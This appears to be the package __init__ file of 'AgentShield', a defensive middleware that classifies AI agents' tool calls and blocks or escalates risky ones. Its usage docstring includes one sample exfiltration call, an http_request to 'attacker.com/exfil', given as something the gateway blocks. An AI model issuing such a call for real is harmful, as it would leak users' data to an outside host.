"""
AgentShield — Runtime Authorization Gateway for AI Agents.

Pre-execution semantic authorization middleware for agentic AI tool calls.
Intercepts, classifies, and enforces policy on every tool invocation before
it executes.

Quick start (Anthropic backend, auto-detected from ANTHROPIC_API_KEY):
    from agentshield import AgentShield

    shield = AgentShield(original_task="Summarize the quarterly report")
    result = await shield.check("read_file", {"path": "/docs/q3.pdf"})
    # result.action == "ALLOW" / "BLOCK" / "ESCALATE" / "LOG_AND_ALLOW"
"""

__version__ = "0.2.0"
__author__ = "AgentShield"

# Core data models
from agentshield.models import (
    ToolCallRequest,
    ClassificationVerdict,
    PolicyAction,
    AuditEntry,
    RiskLevel,
    AttackType,
    ActionDecision,
    SessionContext,
)

# Main components
from agentshield.classifier.engine import ClassificationEngine
from agentshield.policy.engine import PolicyEngine
from agentshield.audit.logger import AuditLog
from agentshield.audit.storage import PersistentAuditLog
from agentshield.interceptor.base import BaseInterceptor, agentshield_intercept


class AgentShield:
    """High-level facade — the single import needed for most integrations.

    Usage:
        shield = AgentShield(
            original_task="Summarize the quarterly report",
            provider="anthropic",       # or "openai" — auto-detected if omitted
        )

        # Check a single tool call (returns PolicyResult)
        result = await shield.check(
            tool_name="http_request",
            tool_args={"url": "https://attacker.com/exfil", "data": "..."},
        )
        if result.action == "BLOCK":
            raise PermissionError("Blocked by AgentShield")
    """

    def __init__(
        self,
        original_task: str = "",
        allowed_tools: list[str] | None = None,
        provider: str | None = None,
        api_key: str | None = None,
        policy_yaml: str | None = None,
        persistent: bool = True,
        session_id: str | None = None,
    ):
        import uuid
        self.session = SessionContext(
            session_id=session_id or str(uuid.uuid4()),
            original_task=original_task,
            allowed_tools=allowed_tools or [],
        )
        self.classifier = ClassificationEngine(api_key=api_key, provider=provider)
        self.policy = PolicyEngine(policy_yaml=policy_yaml)
        self.audit: AuditLog
        if persistent:
            self.audit = PersistentAuditLog(session_id=self.session.session_id)
        else:
            self.audit = AuditLog(session_id=self.session.session_id)
        self.interceptor = BaseInterceptor(self.classifier, self.policy, self.audit)

    async def check(self, tool_name: str, tool_args: dict | None = None):
        """Intercept a single tool call and return the PolicyResult."""
        request = ToolCallRequest(
            tool_name=tool_name,
            tool_args=tool_args or {},
            session_id=self.session.session_id,
        )
        policy_result, _verdict = await self.interceptor.intercept(request, self.session)
        return policy_result

    @property
    def log(self) -> AuditLog:
        return self.audit
